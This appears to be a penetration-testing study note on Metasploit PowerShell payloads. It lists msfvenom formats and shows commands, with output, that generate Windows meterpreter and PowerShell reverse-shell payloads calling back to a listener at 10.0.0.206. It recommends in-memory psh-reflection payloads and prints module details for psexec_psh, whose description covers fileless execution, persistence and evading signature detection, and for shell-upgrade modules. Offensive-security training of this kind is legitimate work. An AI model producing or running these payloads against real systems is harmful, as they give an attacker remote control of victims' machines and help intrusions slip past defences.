#### 52. Metasploit Part 1

- PowerShell payload formats

	- psh
	- psh-cmd
	- psh-net
	- psh-reflection

```sh
root@kali:~# msfvenom --help-formats psh
Executable formats
	asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war
Transform formats
	bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
root@kali:~#
```

- Generating PowerShell payloads

   - ```Script```

	```sh
	root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.206 -f psh > ps_payload64.ps1
	No platform was selected, choosing Msf::Module::Platform::Windows from the payload
	No Arch selected, selecting Arch: x64 from the payload
	No encoder or badchars specified, outputting raw payload
	Payload size: 743 bytes
	Final size of psh file: 4380 bytes
	root@kali:~#
	```
	
	```sh
	root@kali:~# file ps_payload64.ps1
	ps_payload64.ps1: ASCII text, with very long lines, with CRLF line terminators
	root@kali:~#
	```
	
	- ```Shellcode```

	```sh
	root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.206 -f powershell > ps_shellcode
	No platform was selected, choosing Msf::Module::Platform::Windows from the payload
	No Arch selected, selecting Arch: x64 from the payload
	No encoder or badchars specified, outputting raw payload
	Payload size: 668 bytes
	Final size of powershell file: 3265 bytes
	root@kali:~#
	```
	
	```sh
	root@kali:~# file ps_shellcode
	ps_shellcode: ASCII text, with very long lines, with CRLF line terminators
	root@kali:~#
	```
	
	- ```psh-reflection```
	    - Very useful
	    - Compilation happens in memory
	    - No need of execute privileges on temp directory 
	    - Use this often

	```sh
	root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.206 -f psh-reflection > ps_payload64.ps1
	No platform was selected, choosing Msf::Module::Platform::Windows from the payload
	No Arch selected, selecting Arch: x64 from the payload
	No encoder or badchars specified, outputting raw payload
	Payload size: 687 bytes
	Final size of psh-reflection file: 3118 bytes
	
	root@kali:~#
	```
	
	```sh
	root@kali:~# file ps_payload64.ps1
	ps_payload64.ps1: ASCII text, with very long lines, with CRLF line terminators
	root@kali:~#
	```
	
	- ```windows/reverse/reverse_powershell```

	```sh
	root@kali:~# msfvenom -p cmd/windows/reverse_powershell LHOST=10.0.0.206 > ps_payload.ps1
	No platform was selected, choosing Msf::Module::Platform::Windows from the payload
	No Arch selected, selecting Arch: cmd from the payload
	No encoder or badchars specified, outputting raw payload
	Payload size: 1223 bytes
	
	root@kali:~#
	```
	
	```sh
	root@kali:~# file ps_payload.ps1
	ps_payload.ps1: ASCII text, with very long lines, with no line terminators
	root@kali:~#
	```
	
- Metasploit modules which use PowerShell

    - ```exploit/windows/smb/psexec_psh```
        - payload is never written to disk

	```sh
	msf > use exploit/windows/smb/psexec_psh
	```
	    
	```sh
	msf exploit(psexec_psh) > show info
	
	       Name: Microsoft Windows Authenticated Powershell Command Execution
	     Module: exploit/windows/smb/psexec_psh
	   Platform: Windows
	 Privileged: Yes
	    License: Metasploit Framework License (BSD)
	       Rank: Manual
	  Disclosed: 1999-01-01
	
	Provided by:
	  Royce @R3dy__ Davis <rdavis@accuvant.com>
	  RageLtMan <rageltman@sempervictus>
	
	Available targets:
	  Id  Name
	  --  ----
	  0   Automatic
	
	Basic options:
	  Name                  Current Setting  Required  Description
	  ----                  ---------------  --------  -----------
	  DryRun                false            no        Prints the powershell command that would be used
	  RHOST                                  yes       The target address
	  RPORT                 445              yes       The SMB service port (TCP)
	  SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
	  SERVICE_DISPLAY_NAME                   no        The service display name
	  SERVICE_NAME                           no        The service name
	  SMBDomain             .                no        The Windows domain to use for authentication
	  SMBPass                                no        The password for the specified username
	  SMBUser                                no        The username to authenticate as
	
	Payload information:
	  Space: 3072
	
	Description:
	  This module uses a valid administrator username and password to
	  execute a powershell payload using a similar technique to the
	  "psexec" utility provided by SysInternals. The payload is encoded in
	  base64 and executed from the commandline using the -encodedcommand
	  flag. Using this method, the payload is never written to disk, and
	  given that each payload is unique, is less prone to signature based
	  detection. A persist option is provided to execute the payload in a
	  while loop in order to maintain a form of persistence. In the event
	  of a sandbox observing PSH execution, a delay and other obfuscation
	  may be added to avoid detection. In order to avoid interactive
	  process notifications for the current user, the psh payload has been
	  reduced in size and wrapped in a powershell invocation which hides
	  the window entirely.
	
	References:
	  https://cvedetails.com/cve/CVE-1999-0504/
	  OSVDB (3106)
	  http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access
	  http://sourceforge.net/projects/smbexec/
	  http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx
	
	msf exploit(psexec_psh) >
	```
    - ```exploit/windows/local/powershell_cmd_upgrade```
        - used to upgrade a ```native cmd``` to ```meterpreter```

	```sh
	msf > use exploit/windows/local/powershell_cmd_upgrade
	```
	
	```sh
	msf exploit(powershell_cmd_upgrade) > show info
	
	       Name: Windows Command Shell Upgrade (Powershell)
	     Module: exploit/windows/local/powershell_cmd_upgrade
	   Platform: Windows
	 Privileged: No
	    License: Metasploit Framework License (BSD)
	       Rank: Excellent
	  Disclosed: 1999-01-01
	
	Provided by:
	  Ben Campbell <eat_meatballs@hotmail.co.uk>
	
	Available targets:
	  Id  Name
	  --  ----
	  0   Universal
	
	Basic options:
	  Name     Current Setting  Required  Description
	  ----     ---------------  --------  -----------
	  SESSION                   yes       The session to run this module on.
	
	Payload information:
	
	Description:
	  This module executes Powershell to upgrade a Windows Shell session
	  to a full Meterpreter session.
	
	msf exploit(powershell_cmd_upgrade) >
	```